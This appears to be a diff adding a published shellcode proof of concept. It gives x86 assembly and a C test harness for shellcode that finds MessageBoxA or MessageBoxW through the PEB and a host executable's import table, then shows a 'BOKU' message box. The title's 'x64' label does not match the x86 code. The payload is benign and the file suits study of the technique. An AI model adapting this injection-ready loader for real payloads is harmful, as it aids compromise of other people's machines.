@@ -1,0 +1,185 @@
+# Shellcode Title:  Windows\x64 Dynamic MessageBoxA or MessageBoxW PEB & Import Table Method Shellcode (232 bytes)
+# Shellcode Author: Bobby Cooke
+# Date: March 2020-03-17
+# Tested On: 
+# Windows 10 Pro 1909 (x86): HelpPane.exe, notepad.exe, certutil.exe
+# Windows 10 Pro 1909 (x86_64): mmc.exe, xwizard.exe  
+# [!] Will only work if MessageBoxA or MessageBoxW exist in the Import Table of the Host PE
+
+; Create new StackFrame
+ push ebp
+ mov ebp, esp
+ sub esp, 0x10
+
+; Dynamically find the base address of the executable image from the PEB
+; FS_Register > TEB > PEB > &ImageBase
+ xor ecx, ecx
+ mul ecx                 ; Clears EAX, ECX, EDX Registers
+ mov ebx, eax            ; clear EBX Register
+ mov ebx, [fs:ebx+0x30]  ; get PEB address = TEB+0x30
+ mov ebx, [ebx+0x8]      ; get Image Base Addr = PEB+0x8
+ push ebx                ; save &ImageBase in EBX
+ pop  eax                ; copy &ImageBase to EAX
+
+; Get the Address of the Import Table
+; DOS_Header > PE_Signature > ImportTable
+ add eax, [ebx+0x3C]     ; EAX = &PE_Signature
+ mov dl, 0x80            ; &PE_Signature+0x80 = &ImportTable_RVA
+ add ax, dx              ; EAX = &ImportTable_RVA
+ mov edx, [eax]          ; EDX = RVA ImportTable
+ add edx, ebx            ; EDX = &ImportTable
+ add dl, 0xC             ; EDX = &Name_RVA of first Imported DLL
+
+; Create string 'USER32'
+ mov cx, 0x3233          ; 23 : 3233
+ push ecx                ; push "23, 0x0000"
+ push 0x52455355         ; RESU : 52455355
+ mov [ebp-0x4], esp
+
+
+; Find the Name RVA for user32.dll within the Import Table
+; ImportTable > ImportDirectoryTable > LoopNameRVA's
+ xor ecx, ecx            ; ECX = Counter
+
+fUser32Name:
+ push edx                ; EDX = &Name_RVA of first Imported DLL
+ xor eax, eax
+ mov al, 0x14            ; &Name_RVA's are every 20 bytes
+ mul cl                  ; Counter * 20 bytes
+ add [esp], eax
+ pop eax                 ; EAX = &Name_RVA of Nth DLL
+ push eax
+ mov esi, [ebp-0x4]      ; ESI = &String
+ mov edi, [eax]          ; EDI = RVA Name of Nth DLL
+ add edi, ebx            ; EDI = &Name of Nth DLL
+ push ecx                ; save counter to stack
+ xor ecx, ecx
+ cld                     ; clear direction flag = Process strings from left to right
+ mov cl, 0x6             ; ECX = String Length
+ repe cmpsb              ; compare first 6 bytes of &
+ pop ecx                 ; ECX = Counter
+ jz foundUser32Name      ; If string at &Name_RVA == "USER32", then end loop
+ pop eax                 ; Pickup String Addr to fix stack
+ inc ecx                 ;   else Counter ++
+ jmp short fUser32Name   ;   restart the loop
+
+foundUser32Name:
+ pop eax                 ; EAX = &Name_RVA of user32.dll
+ mov [ebp-0x8], eax      ; [ESP-0x8] = &Name_RVA of user32.dll
+ sub al, 0xC             ; EAX = &User32_ImportNameTable_RVA
+ mov eax, [eax]          ; EAX = User32_ImportNameTable_RVA
+ add eax, ebx            ; EAX = &User32_ImportNameTable
+ mov [ebp-0xC], eax      ; [ESP-0xC] = &User32_ImportNameTable
+
+; Create string 'MessageBoxA'
+ mov ecx, 0x41786f6f     ; Axoo : 41786f6f
+ shr ecx, 8
+ push ecx                ; "oxA,0x00"
+ push 0x42656761         ; Bega : 42656761
+ push 0x7373654d         ; sseM : 7373654d
+
+ jmp Counter
+
+MessageBoxW:
+ mov byte [esp+0xA], 0x57 ; Change A to W
+ mov eax, [ebp-0xC]       ; EAX = &User32_ImportNameTable
+
+; Find the Name RVA for MessageBoxA within the Import Table
+; ImportTable > ImportDirectoryTable > LoopNameRVA's
+
+Counter:
+ xor ecx, ecx
+
+fNameLoop:
+ mov esi, esp            ; ESI = "MessageBoxA,0x00"
+ xor edx, edx
+ mov edi, [eax]          ; EDI = RVA NameString
+ cmp edi, edx            ; See if we checked all imported function names
+ je MessageBoxW
+ add edi, ebx            ; EDI = &NameString of Nth Function
+ inc edi                 ; skip the first 2 bytes - Ordinal Value
+ inc edi                 ; skip the first 2 bytes
+ push ecx                ; push counter value
+ xor ecx, ecx
+ cld                     ; clear direction flag = Process strings from left to right
+ mov cl, 0xB             ; ECX = String Length
+ repe cmpsb              ; compare first 11 bytes
+ pop ecx                 ; ECX = Counter value
+ jz foundName            ; If string at &NameString == "MessageBox-", then end loop
+ mov dl, 0x4
+ add eax, edx            ; Next RVA NameString of Imported User32.dll function
+ inc ecx                 ; Counter ++
+ jmp short fNameLoop     ; restart the loop
+
+foundName:
+ mov eax, [ebp-0x8]      ; EAX = &User32_Name_RVA
+ add al, 0x4             ; EAX = &User32_ImportAddressTable_RVA
+ mov edi, [eax]          ; EDI = User32_ImportAddressTable_RVA
+ add edi, ebx            ; EDI = &User32_ImportNameTable
+ xor eax, eax
+ mov al, 0x4
+ mul cx                  ; Counter * 4 = Offset MessageBoxA in Table
+ add eax, edi            ;[EAX] = &MessageBoxA
+ mov eax, [eax]          ; EAX = &MessageBoxA
+
+ mov byte bl, [esp+0xA]  ; DL = 'A' or 'W'
+
+;CALL to MessageBoxA
+;  hOwner = NULL
+;  Text = "BOKU"
+;  Title = "BOKU"
+;  Style = MB_OK|MB_APPLMODAL
+ xor ecx, ecx        ; clear ecx register
+ push ecx            ; string terminator 0x00 for string "BOKU"
+; MessageBoxA or MessageBoxW?
+ cmp bl, 0x41            ; if BL = 'A', then
+ je MsgBoxA              ; push ASCII string
+; String = "B-O-K-U-"
+ push 0x2d552d4b     ; -U-K : 2d552d4b
+ push 0x2d4f2d42     ; -O-B : 2d4f2d42
+ mov edx, esp        ; EDX = &String
+UnicodeStrLoop:
+ inc edx             ; 1st Char +1
+ mov byte [edx], ch  ; Null byte after ever char in Unicode String
+ inc edx             ; Every Other Char +2
+ inc ecx             ; LoopCounter ++
+ cmp cl, 0x4         ; If end of string, then
+ je pushArgs         ; Push arguments to stack for MessageBox- Call
+ jmp short UnicodeStrLoop
+MsgBoxA:
+ push 0x554b4f42     ; UKOB : 554b4f42
+pushArgs:
+ xor ecx, ecx
+ mov ebx, esp        ; EBX = &String
+ push ecx
+ push ebx
+ push ebx
+ push ecx
+ call eax            ; Call MessageBox- Function
+
+############################################################################################################################
+
+#include <windows.h>
+#include <stdio.h>
+
+char code[] = \
+"\x55\x89\xe5\x83\xec\x10\x31\xc9\xf7\xe1\x89\xc3\x64\x8b\x5b\x30\x8b\x5b"
+"\x08\x53\x58\x03\x43\x3c\xb2\x80\x66\x01\xd0\x8b\x10\x01\xda\x80\xc2\x0c"
+"\x66\xb9\x33\x32\x51\x68\x55\x53\x45\x52\x89\x65\xfc\x31\xc9\x52\x31\xc0"
+"\xb0\x14\xf6\xe1\x01\x04\x24\x58\x50\x8b\x75\xfc\x8b\x38\x01\xdf\x51\x31"
+"\xc9\xfc\xb1\x06\xf3\xa6\x59\x74\x04\x58\x41\xeb\xde\x58\x89\x45\xf8\x2c"
+"\x0c\x8b\x00\x01\xd8\x89\x45\xf4\xb9\x6f\x6f\x78\x41\xc1\xe9\x08\x51\x68"
+"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\xeb\x08\xc6\x44\x24\x0a\x57\x8b\x45"
+"\xf4\x31\xc9\x89\xe6\x31\xd2\x8b\x38\x39\xd7\x74\xec\x01\xdf\x47\x47\x51"
+"\x31\xc9\xfc\xb1\x0b\xf3\xa6\x59\x74\x07\xb2\x04\x01\xd0\x41\xeb\xe0\x8b"
+"\x45\xf8\x04\x04\x8b\x38\x01\xdf\x31\xc0\xb0\x04\x66\xf7\xe1\x01\xf8\x8b"
+"\x00\x8a\x5c\x24\x0a\x31\xc9\x51\x80\xfb\x41\x74\x18\x68\x4b\x2d\x55\x2d"
+"\x68\x42\x2d\x4f\x2d\x89\xe2\x42\x88\x2a\x42\x41\x80\xf9\x04\x74\x07\xeb"
+"\xf4\x68\x42\x4f\x4b\x55\x31\xc9\x89\xe3\x51\x53\x53\x51\xff\xd0";
+
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int(*)()) code;
+  (int)(*func)();
+}
